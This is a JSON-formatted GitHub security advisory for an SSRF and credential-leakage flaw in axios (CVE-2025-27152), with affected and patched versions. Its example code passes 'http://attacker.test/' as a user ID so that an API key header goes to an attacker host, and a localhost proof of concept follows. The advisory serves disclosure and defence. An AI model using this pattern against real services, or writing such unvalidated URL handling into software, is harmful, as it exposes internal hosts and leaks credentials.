{
  "Severity": "HIGH",
  "UpdatedAt": "2025-03-28T14:57:52Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "axios"
  },
  "Advisory": {
    "DatabaseId": 283446,
    "Id": "GSA_kwCzR0hTQS1qcjVmLXYyanYtNjl4Ns4ABFM2",
    "GhsaId": "GHSA-jr5f-v2jv-69x6",
    "References": [
      {
        "Url": "https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6"
      },
      {
        "Url": "https://github.com/axios/axios/issues/6463"
      },
      {
        "Url": "https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f"
      },
      {
        "Url": "https://github.com/axios/axios/releases/tag/v1.8.2"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27152"
      },
      {
        "Url": "https://github.com/axios/axios/pull/6829"
      },
      {
        "Url": "https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde"
      },
      {
        "Url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-jr5f-v2jv-69x6"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-27152"
      }
    ],
    "Description": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ‚Å†`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" \u003e /tmp/server1/index.html \necho \"this is server2\" \u003e /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 \u0026\npython -m http.server -d /tmp/server2 10002 \u0026\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-03-07T15:16:00Z",
    "Severity": "HIGH",
    "Summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
    "UpdatedAt": "2025-03-28T14:57:53Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.30.0"
      },
      "VulnerableVersionRange": "\u003c 0.30.0"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "1.8.2"
      },
      "VulnerableVersionRange": "\u003e= 1.0.0, \u003c 1.8.2"
    }
  ]
}